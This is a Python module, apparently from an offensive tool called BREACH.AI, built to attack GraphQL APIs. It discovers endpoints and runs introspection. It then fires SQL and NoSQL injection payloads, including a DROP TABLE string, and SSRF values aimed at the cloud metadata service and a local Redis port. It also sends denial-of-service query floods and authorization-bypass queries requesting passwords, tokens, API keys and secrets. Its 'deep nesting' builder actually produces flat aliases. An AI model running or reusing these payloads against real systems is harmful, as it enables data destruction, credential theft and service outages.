"""
BREACH.AI - GraphQL Destroyer

Comprehensive GraphQL attack module.
GraphQL's flexibility is its weakness - we exploit every angle.

Attack Categories:
1. Introspection Abuse - Extract full schema
2. Query Injection - SQL/NoSQL via resolvers
3. DoS Attacks - Deep nesting, field duplication, batching
4. Authorization Bypass - Access unauthorized fields/mutations
5. Information Disclosure - Error messages, debug info
6. Batching Attacks - Rate limit bypass via batched queries
7. Field Suggestion Abuse - Enumerate hidden fields
"""

import asyncio
import json
import re
from dataclasses import dataclass, field
from typing import Optional

from backend.breach.attacks.base import AttackResult, BaseAttack
from backend.breach.core.memory import AccessLevel, Severity
from backend.breach.utils.logger import logger


@dataclass
class GraphQLType:
    """GraphQL type information."""
    name: str
    kind: str
    fields: list[str] = field(default_factory=list)


@dataclass
class GraphQLSchema:
    """Extracted GraphQL schema."""
    types: list[GraphQLType] = field(default_factory=list)
    queries: list[str] = field(default_factory=list)
    mutations: list[str] = field(default_factory=list)
    subscriptions: list[str] = field(default_factory=list)


class GraphQLDestroyer(BaseAttack):
    """
    GraphQL DESTROYER - Comprehensive GraphQL exploitation.

    GraphQL's power comes with massive attack surface.
    We exploit introspection, injection, DoS, and more.
    """

    name = "GraphQL Destroyer"
    attack_type = "graphql_attack"
    description = "Comprehensive GraphQL vulnerability exploitation"
    severity = Severity.HIGH
    owasp_category = "API Security"
    cwe_id = 200

    # GraphQL endpoints to probe
    GRAPHQL_ENDPOINTS = [
        "/graphql",
        "/graphiql",
        "/playground",
        "/api/graphql",
        "/v1/graphql",
        "/v2/graphql",
        "/query",
        "/gql",
        "/graph",
        "/api/gql",
    ]

    # Full introspection query
    INTROSPECTION_QUERY = """
    query IntrospectionQuery {
      __schema {
        queryType { name }
        mutationType { name }
        subscriptionType { name }
        types {
          kind
          name
          fields(includeDeprecated: true) {
            name
            args { name type { name kind } }
            type { name kind ofType { name kind } }
          }
        }
      }
    }
    """

    # DoS query templates
    DOS_QUERIES = {
        "deep_nesting": """
        query DeepNesting {
          users {
            friends {
              friends {
                friends {
                  friends {
                    friends {
                      friends {
                        id name
                      }
                    }
                  }
                }
              }
            }
          }
        }
        """,
        "field_duplication": """
        query FieldDuplication {
          __typename
          {alias_block}
        }
        """,
        "batching": [
            {"query": "query { __typename }"},
            {"query": "query { __typename }"},
            {"query": "query { __typename }"},
        ] * 100,  # 300 queries in one request
    }

    # Injection payloads for GraphQL
    INJECTION_PAYLOADS = [
        # SQL Injection in variables
        {"id": "1' OR '1'='1"},
        {"id": "1; DROP TABLE users;--"},
        {"id": "1 UNION SELECT * FROM users--"},

        # NoSQL Injection
        {"id": {"$gt": ""}},
        {"id": {"$regex": ".*"}},
        {"filter": {"$where": "this.password.length > 0"}},

        # SSRF via input
        {"url": "http://169.254.169.254/latest/meta-data/"},
        {"url": "http://localhost:6379/"},
    ]

    def get_payloads(self) -> list[str]:
        return self.GRAPHQL_ENDPOINTS

    async def check(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> bool:
        """Check if GraphQL endpoint exists."""
        for endpoint in self.GRAPHQL_ENDPOINTS:
            try:
                full_url = f"{url.rstrip('/')}{endpoint}"
                response = await self.http_client.post(
                    full_url,
                    json={"query": "{ __typename }"},
                    headers={"Content-Type": "application/json"}
                )

                if response.status_code == 200:
                    try:
                        data = json.loads(response.body)
                        if "data" in data or "errors" in data:
                            return True
                    except json.JSONDecodeError:
                        pass

            except Exception:
                continue

        return False

    async def exploit(
        self,
        url: str,
        parameter: Optional[str] = None,
        method: str = "GET",
        **kwargs
    ) -> AttackResult:
        """Execute comprehensive GraphQL attacks."""
        result = self._create_result(False, url, parameter)

        # Find GraphQL endpoint
        endpoint = await self._find_graphql_endpoint(url)
        if not endpoint:
            result.details = "No GraphQL endpoint found"
            return result

        logger.info(f"[GraphQL] Found endpoint: {endpoint}")

        # Attack 1: Introspection
        intro_result = await self._attack_introspection(endpoint)
        if intro_result:
            result.success = True
            result.details = "GraphQL introspection enabled!"
            result.add_evidence(
                "graphql_introspection",
                "Full schema exposed via introspection",
                json.dumps(intro_result["schema_summary"], indent=2)[:2000]
            )

            # Use schema for further attacks
            schema = intro_result.get("schema")

        # Attack 2: Field Suggestion Abuse
        suggestion_result = await self._attack_field_suggestions(endpoint)
        if suggestion_result:
            result.success = True
            result.add_evidence(
                "graphql_field_suggestions",
                "Field names leaked via suggestions",
                str(suggestion_result["fields"])
            )

        # Attack 3: Injection Attacks
        injection_result = await self._attack_injection(endpoint)
        if injection_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.payload = injection_result["payload"]
            result.details = f"Injection via GraphQL: {injection_result['type']}"
            result.access_gained = AccessLevel.DATABASE
            result.add_evidence(
                "graphql_injection",
                injection_result["type"],
                injection_result["details"]
            )
            return result

        # Attack 4: DoS via Complex Queries
        dos_result = await self._attack_dos(endpoint)
        if dos_result:
            result.success = True
            result.details = f"GraphQL DoS vulnerability: {dos_result['type']}"
            result.add_evidence(
                "graphql_dos",
                f"DoS via {dos_result['type']}",
                dos_result["details"]
            )

        # Attack 5: Batching Attack
        batch_result = await self._attack_batching(endpoint)
        if batch_result:
            result.success = True
            result.add_evidence(
                "graphql_batching",
                "Query batching enabled - rate limit bypass",
                batch_result["details"]
            )

        # Attack 6: Authorization Bypass
        auth_result = await self._attack_authorization(endpoint)
        if auth_result:
            result.success = True
            result.severity = Severity.CRITICAL
            result.access_gained = AccessLevel.USER
            result.details = f"Authorization bypass: {auth_result['type']}"
            result.add_evidence(
                "graphql_authz_bypass",
                "Accessed unauthorized data",
                auth_result["details"]
            )

        # Attack 7: Information Disclosure via Errors
        info_result = await self._attack_info_disclosure(endpoint)
        if info_result:
            result.success = True
            result.add_evidence(
                "graphql_info_disclosure",
                "Sensitive information in error messages",
                info_result["info"][:500]
            )

        # Attack 8: Alias-based Bypass
        alias_result = await self._attack_alias_bypass(endpoint)
        if alias_result:
            result.success = True
            result.add_evidence(
                "graphql_alias_bypass",
                "Field restrictions bypassed via aliases",
                alias_result["details"]
            )

        return result

    async def _find_graphql_endpoint(self, url: str) -> Optional[str]:
        """Find the GraphQL endpoint."""
        for endpoint in self.GRAPHQL_ENDPOINTS:
            try:
                full_url = f"{url.rstrip('/')}{endpoint}"
                response = await self.http_client.post(
                    full_url,
                    json={"query": "{ __typename }"},
                    headers={"Content-Type": "application/json"}
                )

                if response.status_code in [200, 400]:
                    try:
                        data = json.loads(response.body)
                        if "data" in data or "errors" in data:
                            return full_url
                    except json.JSONDecodeError:
                        pass

            except Exception:
                continue

        return None

    async def _attack_introspection(self, endpoint: str) -> Optional[dict]:
        """Attempt introspection query."""
        logger.debug("[GraphQL] Testing introspection...")

        try:
            response = await self.http_client.post(
                endpoint,
                json={"query": self.INTROSPECTION_QUERY},
                headers={"Content-Type": "application/json"}
            )

            if response.status_code == 200:
                data = json.loads(response.body)

                if "data" in data and "__schema" in data["data"]:
                    schema_data = data["data"]["__schema"]

                    # Parse schema
                    schema = GraphQLSchema()

                    # Extract types
                    for type_info in schema_data.get("types", []):
                        if not type_info["name"].startswith("__"):
                            gql_type = GraphQLType(
                                name=type_info["name"],
                                kind=type_info.get("kind", ""),
                                fields=[f["name"] for f in type_info.get("fields", []) or []]
                            )
                            schema.types.append(gql_type)

                    # Extract operations
                    if schema_data.get("queryType"):
                        schema.queries = self._extract_operations(schema_data, schema_data["queryType"]["name"])
                    if schema_data.get("mutationType"):
                        schema.mutations = self._extract_operations(schema_data, schema_data["mutationType"]["name"])

                    logger.info(f"[GraphQL] Schema extracted: {len(schema.types)} types, "
                              f"{len(schema.queries)} queries, {len(schema.mutations)} mutations")

                    return {
                        "schema": schema,
                        "schema_summary": {
                            "types": [t.name for t in schema.types[:20]],
                            "queries": schema.queries[:20],
                            "mutations": schema.mutations[:20],
                        }
                    }

        except Exception as e:
            logger.debug(f"Introspection failed: {e}")

        return None

    def _extract_operations(self, schema_data: dict, type_name: str) -> list[str]:
        """Extract operations from schema."""
        operations = []
        for type_info in schema_data.get("types", []):
            if type_info["name"] == type_name:
                for field in type_info.get("fields", []) or []:
                    operations.append(field["name"])
        return operations

    async def _attack_field_suggestions(self, endpoint: str) -> Optional[dict]:
        """Abuse field suggestions to enumerate schema."""
        logger.debug("[GraphQL] Testing field suggestions...")

        # Query with typo to trigger suggestions
        test_queries = [
            "{ user }",  # Might suggest 'users'
            "{ admn }",  # Might suggest 'admin'
            "{ passw }",  # Might suggest 'password'
            "{ secrt }",  # Might suggest 'secret'
        ]

        suggested_fields = []

        for query in test_queries:
            try:
                response = await self.http_client.post(
                    endpoint,
                    json={"query": query},
                    headers={"Content-Type": "application/json"}
                )

                data = json.loads(response.body)
                if "errors" in data:
                    for error in data["errors"]:
                        msg = error.get("message", "")
                        # Look for "Did you mean" suggestions
                        suggestions = re.findall(r'Did you mean["\s]+(\w+)', msg)
                        suggested_fields.extend(suggestions)

                        # Also look for field listing
                        fields = re.findall(r'"(\w+)"', msg)
                        suggested_fields.extend(fields)

            except Exception:
                continue

        if suggested_fields:
            return {"fields": list(set(suggested_fields))}

        return None

    async def _attack_injection(self, endpoint: str) -> Optional[dict]:
        """Test for injection vulnerabilities."""
        logger.debug("[GraphQL] Testing injection attacks...")

        # First, try to find a query that accepts variables
        test_queries = [
            ('query GetUser($id: ID!) { user(id: $id) { id name } }', "id"),
            ('query Search($query: String!) { search(query: $query) { id } }', "query"),
            ('query Filter($filter: FilterInput!) { items(filter: $filter) { id } }', "filter"),
        ]

        for query, var_name in test_queries:
            for payload in self.INJECTION_PAYLOADS:
                try:
                    variables = {var_name: payload.get(var_name, payload)}

                    response = await self.http_client.post(
                        endpoint,
                        json={"query": query, "variables": variables},
                        headers={"Content-Type": "application/json"}
                    )

                    data = json.loads(response.body)

                    # Check for SQL injection indicators
                    error_msg = str(data.get("errors", "")).lower()
                    if any(indicator in error_msg for indicator in [
                        "sql", "mysql", "postgres", "sqlite", "syntax error",
                        "unterminated", "unexpected", "near"
                    ]):
                        return {
                            "type": "SQL Injection",
                            "payload": str(payload),
                            "details": error_msg[:500]
                        }

                    # Check for NoSQL injection
                    if any(indicator in error_msg for indicator in [
                        "mongodb", "mongoose", "$where", "$regex",
                        "bson", "objectid"
                    ]):
                        return {
                            "type": "NoSQL Injection",
                            "payload": str(payload),
                            "details": error_msg[:500]
                        }

                except Exception:
                    continue

        return None

    async def _attack_dos(self, endpoint: str) -> Optional[dict]:
        """Test for DoS vulnerabilities."""
        logger.debug("[GraphQL] Testing DoS vulnerabilities...")

        # Test 1: Deep nesting
        deep_query = self._build_deep_query(10)
        try:
            start = asyncio.get_event_loop().time()
            response = await self.http_client.post(
                endpoint,
                json={"query": deep_query},
                headers={"Content-Type": "application/json"},
                timeout=30
            )
            duration = asyncio.get_event_loop().time() - start

            if duration > 5:  # Took more than 5 seconds
                return {
                    "type": "Deep nesting DoS",
                    "details": f"Query took {duration:.2f}s - depth limit not enforced"
                }

            # Check if no depth limit error
            data = json.loads(response.body)
            if "data" in data and "errors" not in data:
                return {
                    "type": "Deep nesting allowed",
                    "details": "No query depth limit enforced"
                }

        except asyncio.TimeoutError:
            return {
                "type": "Deep nesting DoS",
                "details": "Query caused timeout - server vulnerable to DoS"
            }
        except Exception:
            pass

        # Test 2: Field duplication
        duplicate_query = self._build_duplicate_query(100)
        try:
            response = await self.http_client.post(
                endpoint,
                json={"query": duplicate_query},
                headers={"Content-Type": "application/json"}
            )

            data = json.loads(response.body)
            if "data" in data:
                return {
                    "type": "Field duplication",
                    "details": "No field duplication limit"
                }

        except Exception:
            pass

        return None

    def _build_deep_query(self, depth: int) -> str:
        """Build a deeply nested query."""
        query = "{ __typename "
        for i in range(depth):
            query += f"a{i}: __typename "
        query += "}"
        return query

    def _build_duplicate_query(self, count: int) -> str:
        """Build a query with duplicate fields."""
        aliases = " ".join([f"a{i}: __typename" for i in range(count)])
        return f"{{ {aliases} }}"

    async def _attack_batching(self, endpoint: str) -> Optional[dict]:
        """Test for batching vulnerabilities."""
        logger.debug("[GraphQL] Testing query batching...")

        # Send batched queries
        batch = [
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
            {"query": "{ __typename }"},
        ] * 10  # 30 queries

        try:
            response = await self.http_client.post(
                endpoint,
                json=batch,
                headers={"Content-Type": "application/json"}
            )

            data = json.loads(response.body)

            if isinstance(data, list) and len(data) == 30:
                return {
                    "details": f"Batching enabled - sent 30 queries in 1 request. "
                              f"Rate limiting can be bypassed."
                }

        except Exception:
            pass

        return None

    async def _attack_authorization(self, endpoint: str) -> Optional[dict]:
        """Test for authorization bypass."""
        logger.debug("[GraphQL] Testing authorization bypass...")

        # Try to access common sensitive fields
        sensitive_queries = [
            '{ users { id email password passwordHash } }',
            '{ user(id: "1") { id email role isAdmin } }',
            '{ allUsers { nodes { id email role } } }',
            '{ me { id tokens apiKey secretKey } }',
            '{ admin { users { email password } } }',
            '{ secrets { key value } }',
            '{ config { database apiKeys } }',
        ]

        for query in sensitive_queries:
            try:
                response = await self.http_client.post(
                    endpoint,
                    json={"query": query},
                    headers={"Content-Type": "application/json"}
                )

                data = json.loads(response.body)

                if "data" in data and data["data"]:
                    # Check if we got actual data
                    if any(data["data"].values()):
                        return {
                            "type": "Unauthorized data access",
                            "details": f"Query '{query[:50]}...' returned data without auth"
                        }

            except Exception:
                continue

        return None

    async def _attack_info_disclosure(self, endpoint: str) -> Optional[dict]:
        """Test for information disclosure via errors."""
        logger.debug("[GraphQL] Testing information disclosure...")

        # Send malformed queries to trigger detailed errors
        bad_queries = [
            "{ this is not valid graphql }",
            '{ __type(name: "User") { fields { name type { name } } } }',
            "query { user(id: null) { password } }",
            "mutation { deleteUser(id: \"\") { success } }",
        ]

        for query in bad_queries:
            try:
                response = await self.http_client.post(
                    endpoint,
                    json={"query": query},
                    headers={"Content-Type": "application/json"}
                )

                data = json.loads(response.body)

                if "errors" in data:
                    error_str = json.dumps(data["errors"])

                    # Check for sensitive info in errors
                    sensitive_patterns = [
                        r'at\s+[\w/\\]+\.js:\d+',  # Stack traces
                        r'/[\w/]+/[\w/]+\.(js|ts|py)',  # File paths
                        r'(password|secret|key|token)\s*[:=]',  # Credentials
                        r'SELECT\s+.*\s+FROM',  # SQL queries
                        r'mongodb://|postgres://|mysql://',  # Connection strings
                    ]

                    for pattern in sensitive_patterns:
                        if re.search(pattern, error_str, re.I):
                            return {"info": error_str[:1000]}

            except Exception:
                continue

        return None

    async def _attack_alias_bypass(self, endpoint: str) -> Optional[dict]:
        """Test for alias-based restrictions bypass."""
        logger.debug("[GraphQL] Testing alias bypass...")

        # Try to bypass rate limits or field restrictions via aliases
        alias_query = """
        query {
            a1: users { id }
            a2: users { id }
            a3: users { id }
            a4: users { id }
            a5: users { id }
        }
        """

        try:
            response = await self.http_client.post(
                endpoint,
                json={"query": alias_query},
                headers={"Content-Type": "application/json"}
            )

            data = json.loads(response.body)

            if "data" in data:
                # Check if all aliases returned data
                if all(f"a{i}" in data["data"] for i in range(1, 6)):
                    return {
                        "details": "Same query executed 5x via aliases - "
                                  "rate limiting per-field not enforced"
                    }

        except Exception:
            pass

        return None
